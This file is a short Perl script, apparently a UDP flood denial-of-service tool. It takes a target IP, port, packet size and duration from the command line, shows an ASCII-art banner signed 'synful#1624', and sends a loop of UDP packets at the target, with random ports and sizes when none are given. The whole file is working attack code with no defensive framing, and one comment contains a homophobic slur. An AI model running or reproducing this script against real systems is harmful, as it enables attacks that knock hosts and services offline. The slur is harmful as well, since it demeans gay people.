use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "perl $0 <host> <Port> <Packet Size (1-65495)> <Time>\nexample: perl $0 74.74.74.85 80 1024 30\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

$clear_string = `clear`;

print $clear_string;

print <<EOTEXT;
\033[2;34m                         ______                    
\033[2;34m _________        .---"""      """---.              
\033[2;34m:______.-':      :  .--------------.  :             
\033[2;34m| \033[1;35m______\033[1;34m  |      | :                : |             
\033[2;34m|:\033[1;35m______B\033[1;34m:|      | |  \033[1;35mLittle Error:\033[0m\033[1;34m | |             
\033[2;34m|:\033[1;35m______B\033[1;34m:|      | |                | |             
\033[2;34m|:\033[1;35m______B\033[1;34m:|      | |  \033[1;35mWifi not\033[0m\033[1;34m      | |             
\033[2;34m|         |      | |  \033[1;35mfound.\033[0m\033[1;34m        | |             
\033[2;34m|:\033[1;35m_____\033[1;34m:  |      | |                | |             
\033[2;34m|    ==   |      | :                : |             
\033[2;34m|       \033[1;31mO\033[1;34m |      :  '--------------'  :             
\033[2;34m|       \033[1;31mo\033[1;34m |      :'---...______...---'              
\033[2;34m|       \033[1;31mo\033[1;34m |-._.-i___/'             \._              
\033[2;34m|'-.____\033[1;35mo\033[1;34m_|   '-.   '-...______...-'  `-._          
\033[2;34m:_________:      `.____________________   `-.___.-. 
\033[2;34m                 .'\033[1;35m.eeeeeeeeeeeeeeeeee.'.\033[1;34m      :___:
\033[0;35m synful#1624 \033[0m\033[1;34m  .'\033[1;35m.eeeeeeeeeeeeeeeeeeeeee.'.\033[1;34m    
\033[2;34m              :____________________________:        
\033[2;34m                                                    \033[0m
\033[2;34m           \033[2;34mhost: \033[1;35m$ip\033[2;34m port: \033[1;35m$port\033[2;34m time: \033[1;35m$time\033[0m
EOTEXT
;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
# made by synful#1624 any skidding of this is gay
  send(flood, pack("a$psize","\x00\x00\x00\x00\x00\x01\x00\x00stats"), 0, pack_sockaddr_in($pport, $iaddr));}